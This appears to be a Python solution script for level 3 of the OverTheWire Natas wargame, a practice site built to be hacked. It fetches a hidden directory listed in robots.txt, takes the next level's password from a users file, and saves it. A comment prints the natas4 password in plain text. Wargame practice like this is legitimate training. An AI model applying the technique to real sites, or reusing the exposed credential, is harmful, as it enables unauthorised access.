from bs4 import BeautifulSoup
import requests


lvl = '3'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()


url = f'http://natas{lvl}.natas.labs.overthewire.org/s3cr3t/users.txt'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)
soup = BeautifulSoup(requests.get(url=url,auth=lvl_pass).text, 'html.parser')
pw = soup.text.strip()[-32:]

open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)

'''
Directory name located in robots.txt

Username: natas4
Password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

'''
